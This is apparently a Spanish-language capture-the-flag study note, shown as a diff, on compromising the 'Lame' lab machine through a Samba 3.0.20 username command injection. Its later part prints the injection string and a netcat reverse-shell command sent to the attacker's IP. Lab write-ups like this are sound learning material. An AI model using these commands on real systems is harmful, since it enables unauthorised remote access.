@@ -1,0 +1,67 @@
+maquina Lame ---------------------------- linux 
+
+aprendizaje
+
+SAMBA
+Penetration Tester Level 1
+Network
+Vulnerability Assessment
+Common Services
+Outdated Software
+Security Tools
+Metasploit
+Remote Code Execution
+
+-----------------------------------------
+
+en esta maquina intentamos entrar por ftp pero no nos deja hacer nada, vemos el tema de enumerar un poco el smb
+
+y vemos que nos lanza un error
+
+protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
+
+hemos buscado por google el tema de no poder entrar por ese error y la gente ha dicho que podemos entrar
+con este comando 
+
+❯ smbclient -L 10.10.10.3 -N --option 'client min protocol = NT1'
+
+con ese comando es como si le dijeraos que la version que queremos entrar es la NT1 
+el -N es para indicarle el "no pass" porque no tenemos pase... 
+
+podemos ver que nos arroja informacion y ahora en vez de listar lo que vamos a hacer es 
+conectarnos el servicio que tiene dentro que es tmp
+
+smbclient //10.10.10.3/tmp -N --option 'client min protocol = NT1' 
+
+no tenemos nada interesante 
+
+podemos ver tiene la herramienta logon activa y hemos visto un exploit de metasploit que puede inyectar
+algo raro que puede conectarse 
+
+hemos buscado ese exploit con 
+
+searchsploit Samba 3.0.20 y hemos cogido de los dos que salen el de meta...
+
+tiene este codigo 
+
+# lol?
+        username = "/=`nohup " + payload.encoded + "`"
+        begin
+            simple.client.negotiate(false) 
+
+vemos que podemos poner /=`nohup` y entre esas comillas que lo que hace es escapar el texto podemos inyectar cosas.. 
+
+es decir una vez estamos conectados si ponemos este comando podemos inyectar cosas 
+
+logon "/=`nohup ping 10.10.14.25`" y si nos ponemos es escucha con tcpdum -i tun0 icmp -n podemos ver que nos arroja un ping
+
+por lo tanto podemos lanzar comandos
+
+logon "/=`nohup nc -e /bin/sh 10.10.14.25 4646`" 
+
+lo hemos lanzado con netcat porque con bash no nos ha funcionado... 
+
+hemos conseguido acceso asi. 
+
+
+
